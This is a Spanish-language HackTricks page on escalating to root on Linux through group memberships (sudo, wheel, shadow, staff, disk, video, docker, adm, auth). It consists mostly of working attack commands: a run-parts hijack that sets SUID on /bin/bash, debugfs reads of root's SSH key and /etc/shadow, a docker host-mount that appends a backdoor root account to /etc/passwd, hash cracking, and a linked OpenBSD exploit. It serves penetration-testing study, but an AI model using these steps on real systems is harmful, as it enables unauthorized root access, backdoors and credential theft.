# Grupos interesantes - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Grupos Sudo/Admin

### **PE - Method 1**

**A veces**, **por defecto (o porque algún software lo necesita)** dentro del archivo **/etc/sudoers** puedes encontrar algunas de estas líneas:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Esto significa que **cualquier usuario que pertenezca al grupo sudo o admin puede ejecutar cualquier cosa como sudo**.

Si este es el caso, para **convertirte en root solo tienes que ejecutar**:
```
sudo su
```
### PE - Método 2

Find all suid binaries and check if there is the binary **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Si encuentras que el binario **pkexec es un binario SUID** y perteneces a **sudo** o **admin**, probablemente podrías ejecutar binarios como sudo usando `pkexec`.\
Esto se debe a que normalmente esos son los grupos incluidos en la **política de polkit**. Básicamente, esta política identifica qué grupos pueden usar `pkexec`. Compruébalo con:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Allí encontrarás qué grupos tienen permitido ejecutar **pkexec** y, **de forma predeterminada**, en algunas distribuciones de Linux aparecen los grupos **sudo** y **admin**.

Para **convertirte en root puedes ejecutar**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Si intentas ejecutar **pkexec** y obtienes este **error**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**No es porque no tengas permisos, sino porque no estás conectado sin una GUI**. Y existe una solución alternativa para este problema aquí: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Necesitas **2 sesiones ssh diferentes**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Grupo Wheel

**A veces**, **de forma predeterminada**, dentro del archivo **/etc/sudoers** puedes encontrar esta línea:
```
%wheel	ALL=(ALL:ALL) ALL
```
Esto significa que **cualquier usuario que pertenezca al grupo wheel puede ejecutar cualquier cosa como sudo**.

Si este es el caso, para **convertirte en root solo tienes que ejecutar**:
```
sudo su
```
## Grupo shadow

Los usuarios del **grupo shadow** pueden **leer** el archivo **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Así que lee el archivo e intenta **crackear algunos hashes**.

Matiz importante sobre el estado de bloqueo al analizar hashes:
- Las entradas con `!` o `*` generalmente no permiten iniciar sesión de forma interactiva mediante contraseña.
- `!hash` normalmente significa que se estableció una contraseña y luego se bloqueó.
- `*` normalmente significa que nunca se estableció un hash de contraseña válido.

Esto resulta útil para clasificar cuentas incluso cuando el inicio de sesión directo está bloqueado.

## Grupo Staff

**staff**: Permite a los usuarios añadir modificaciones locales al sistema (`/usr/local`) sin necesitar privilegios de root (ten en cuenta que los ejecutables de `/usr/local/bin` están en la variable PATH de cualquier usuario y pueden "sobrescribir" los ejecutables de `/bin` y `/usr/bin` con el mismo nombre). Compáralo con el grupo "adm", que está más relacionado con la monitorización y la seguridad. [\[source\]](https://wiki.debian.org/SystemGroups)

En las distribuciones Debian, la variable `$PATH` muestra que `/usr/local/` se ejecutará con la prioridad más alta, tanto si eres un usuario con privilegios como si no.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Si podemos secuestrar algunos programas en `/usr/local`, podemos obtener root fácilmente.

Secuestrar el programa `run-parts` es una forma fácil de obtener root, porque la mayoría de los programas ejecutan `run-parts` (como `crontab`, al iniciar sesión mediante SSH).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
o Cuando se inicia sesión en una nueva sesión ssh.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Grupo de discos

Este privilegio es casi **equivalente al acceso root**, ya que puedes acceder a todos los datos dentro de la máquina.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Ten en cuenta que usando debugfs también puedes **escribir archivos**. Por ejemplo, para copiar `/tmp/asd1.txt` a `/tmp/asd2.txt` puedes hacer:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Sin embargo, si intentas **escribir archivos propiedad de root** (como `/etc/shadow` o `/etc/passwd`), obtendrás un error de "**Permission denied**".

## Grupo video

Usando el comando `w`, puedes encontrar **quién ha iniciado sesión en el sistema**, y mostrará una salida como la siguiente:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
El **tty1** significa que el usuario **yossi ha iniciado sesión físicamente** en un terminal de la máquina.

El **grupo video** tiene acceso para ver la salida de la pantalla. Básicamente, puedes observar las pantallas. Para hacerlo, necesitas **capturar la imagen actual de la pantalla** en datos sin procesar y obtener la resolución que está utilizando la pantalla. Los datos de la pantalla pueden guardarse en `/dev/fb0`, y puedes encontrar la resolución de esta pantalla en `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Para **abrir** la **imagen raw**, puedes usar **GIMP**, seleccionar el archivo **`screen.raw`** y seleccionar como tipo de archivo **Raw image data**:

![Disk Group - Video Group: Para abrir la imagen raw puedes usar GIMP, seleccionar el archivo screen.raw y seleccionar como tipo de archivo Raw image data](<../../../images/image (463).png>)

Después, modifica el ancho y el alto según los utilizados en la pantalla y prueba diferentes tipos de imagen (y selecciona el que muestre mejor la pantalla):

![Disk Group - Video Group: Después, modifica el ancho y el alto según los utilizados en la pantalla y prueba diferentes tipos de imagen (y selecciona el que muestre mejor la pantalla)](<../../../images/image (317).png>)

## Root Group

Parece que, de forma predeterminada, los **miembros del grupo root** podrían tener acceso para **modificar** algunos archivos de configuración de **services**, algunos archivos de **libraries** u otros elementos interesantes que podrían utilizarse para escalar privilegios...

**Comprueba qué archivos pueden modificar los miembros de root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Grupo Docker

Puedes **montar el sistema de archivos raíz de la máquina host en el volumen de una instancia**, de modo que, cuando la instancia se inicia, carga inmediatamente un `chroot` en ese volumen. Esto te proporciona efectivamente acceso root en la máquina.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Finalmente, si no te gusta ninguna de las sugerencias anteriores, o no funcionan por alguna razón (¿firewall de la API de docker?), siempre puedes intentar **ejecutar un contenedor privilegiado y escapar de él**, como se explica aquí:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Si tienes permisos de escritura sobre el socket de docker, lee [**este post sobre cómo escalar privilegios abusando del socket de docker**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Grupo lxc/lxd


{{#ref}}
./
{{#endref}}

## Grupo Adm

Normalmente, los **miembros** del grupo **`adm`** tienen permisos para **leer archivos de log** ubicados dentro de _/var/log/_.\
Por lo tanto, si has comprometido un usuario de este grupo, definitivamente deberías **revisar los logs**.

## Grupos Backup / Operator / lp / Mail

Estos grupos suelen ser vectores de **descubrimiento de credenciales** en lugar de vectores directos hacia root:
- **backup**: puede exponer archivos con configuraciones, claves, volcados de DB o tokens.
- **operator**: acceso operativo específico de la plataforma que puede filtrar datos sensibles de runtime.
- **lp**: las colas/spools de impresión pueden contener el contenido de documentos.
- **mail**: los spools de correo pueden exponer enlaces de restablecimiento, OTPs y credenciales internas.

Considera la pertenencia a estos grupos como un hallazgo de exposición de datos de alto valor y realiza pivoting mediante la reutilización de contraseñas/tokens.

## Grupo Auth

En OpenBSD, el grupo **auth** normalmente puede escribir en las carpetas _**/etc/skey**_ y _**/var/db/yubikey**_ si se utilizan.\
Estos permisos pueden abusarse con el siguiente exploit para **escalar privilegios** a root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
